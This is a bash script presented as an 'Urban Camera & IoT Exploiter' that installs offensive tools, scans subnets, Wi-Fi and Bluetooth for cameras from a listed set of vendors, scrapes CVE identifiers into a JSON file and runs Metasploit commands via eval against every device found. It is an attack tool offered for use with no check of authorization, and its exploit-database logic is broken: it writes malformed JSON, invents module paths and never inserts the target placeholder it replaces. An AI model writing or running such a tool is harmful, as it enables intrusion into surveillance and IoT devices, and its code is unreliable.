#!/bin/bash
# Urban Camera & IoT Scanner & Exploit Executor
# Supports Linux/macOS | Detects Networks | Builds & Updates Exploit DB | Runs Exploits Safely

# Colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

EXPLOIT_DB="exploits_db.json"
EXPLOIT_SOURCES=("https://www.exploit-db.com" "https://nvd.nist.gov/" "https://github.com/search?q=CVE" "https://www.metasploit.com/modules")

echo -e "${CYAN}🚀 Urban Camera & IoT Exploiter - Multi-Network Scanner & Access Tool${NC}"

# Detect OS
OS=$(uname -s)
if [[ "$OS" == "Darwin" ]]; then
    SYSTEM="macOS"
    PKG_MANAGER="brew"
elif [[ "$OS" == "Linux" ]]; then
    SYSTEM="Linux"
    PKG_MANAGER="apt-get"
else
    echo -e "${RED}❌ Unsupported system. Exiting.${NC}"
    exit 1
fi

echo -e "${GREEN}✅ Running on $SYSTEM${NC}"

# Function to install dependencies
install_dependencies() {
    echo -e "${YELLOW}🔄 Checking and installing missing dependencies...${NC}"
    DEPS=("nmap" "arp-scan" "hcitool" "tcpdump" "aircrack-ng" "iwlist" "masscan" "bettercap" "hydra" "metasploit-framework" "jq")

    for dep in "${DEPS[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo -e "${CYAN}📦 Installing: $dep${NC}"
            sudo $PKG_MANAGER install -y $dep
        else
            echo -e "${GREEN}✅ $dep is already installed${NC}"
        fi
    done
}

install_dependencies

# Function to get active network interfaces
get_interfaces() {
    ip -o link show | awk -F': ' '{print $2}' | grep -v "lo"
}

# Full OEM list for urban surveillance and IoT
OEM_LIST="Hikvision|Dahua|Axis|Bosch|Samsung|Sony|Panasonic|Cisco|Uniview|Vivotek|Hanwha Techwin|Mobotix|Pelco|Flir|Avigilon|Genetec|Milestone|Arecont Vision|Honeywell|Qognify|Tyco Security|D-Link|Ubiquiti|TP-Link|Netgear|EZVIZ|Reolink"

# Function to scan network
scan_network() {
    local iface=$1
    local subnet=$(ip -4 addr show "$iface" | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+')

    if [ -z "$subnet" ]; then
        echo -e "${YELLOW}⚠️ No active IP found on $iface, skipping...${NC}"
        return
    fi

    echo -e "${GREEN}📡 Scanning subnet: $subnet on $iface${NC}"
    sudo nmap -sS -p 80,443,554,8000-9000,22,23,161,8080,37777 --open -T4 "$subnet" -oG - | grep "Up" | awk '{print $2}'
}

# Function to scan Wi-Fi for IoT devices
scan_wifi() {
    echo -e "${GREEN}📶 Scanning Wi-Fi for connected IoT devices...${NC}"
    sudo arp-scan --localnet | grep -E "$OEM_LIST" | awk '{print $1, $2, $3}'
}

# Function to scan Bluetooth devices
scan_bluetooth() {
    echo -e "${GREEN}🔵 Scanning Bluetooth for IoT & Smart Devices...${NC}"
    hcitool scan | grep -E "$OEM_LIST" || echo -e "${RED}⚠️ No Bluetooth devices found.${NC}"
}

# Function to build/update exploit database
update_exploit_db() {
    echo -e "${CYAN}🔄 Updating Exploit Database...${NC}"
    
    echo '{ "exploits": [] }' > "$EXPLOIT_DB"

    for src in "${EXPLOIT_SOURCES[@]}"; do
        echo -e "${YELLOW}📡 Fetching exploits from: $src...${NC}"
        # Simulated Fetching - Replace with actual API calls if needed
        curl -s "$src" | grep -oP "CVE-[0-9]{4}-[0-9]{4,}" | while read -r CVE; do
            echo -e "${GREEN}💣 Found Exploit: $CVE${NC}"
            echo "{ \"name\": \"$CVE\", \"target\": \"Unknown\", \"command\": \"msfconsole -q -x 'search $CVE; use exploit/$CVE; run'\" }," >> "$EXPLOIT_DB"
        done
    done

    sed -i '$ s/.$//' "$EXPLOIT_DB"
    echo "]}" >> "$EXPLOIT_DB"

    echo -e "${GREEN}✅ Exploit database updated!${NC}"
}

# Function to execute exploits
execute_exploits() {
    echo -e "${YELLOW}🛑 WARNING: Do you want to attempt exploitation on detected devices? (yes/no)${NC}"
    read -r user_input

    if [[ "$user_input" == "yes" ]]; then
        echo -e "${RED}💥 Proceeding with exploitation attempts...${NC}"
        while IFS= read -r ip; do
            echo -e "${CYAN}🔹 Targeting: $ip${NC}"
            for exploit in $(jq -c '.exploits[]' "$EXPLOIT_DB"); do
                CMD=$(echo "$exploit" | jq -r '.command' | sed "s/TARGET_IP/$ip/g")
                echo -e "${GREEN}💣 Running: $CMD${NC}"
                eval "$CMD"
            done
        done < detected_devices.txt
    else
        echo -e "${CYAN}✅ Scan completed. No exploits executed.${NC}"
    fi
}

# User menu
while true; do
    echo -e "${CYAN}🚀 Urban Scanner - Main Menu${NC}"
    echo "1) Scan Networks for Cameras & IoT"
    echo "2) Update Exploit Database"
    echo "3) Run Exploits on Detected Devices"
    echo "4) Exit"
    read -p "Choose an option: " choice

    case $choice in
        1)
            echo -e "${YELLOW}🔍 Scanning for devices...${NC}"
            for iface in $(get_interfaces); do
                scan_network "$iface"
            done > detected_devices.txt
            scan_wifi >> detected_devices.txt
            scan_bluetooth >> detected_devices.txt
            ;;
        2)
            update_exploit_db
            ;;
        3)
            execute_exploits
            ;;
        4)
            echo -e "${CYAN}🚀 Exiting...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}❌ Invalid choice!${NC}"
            ;;
    esac
done
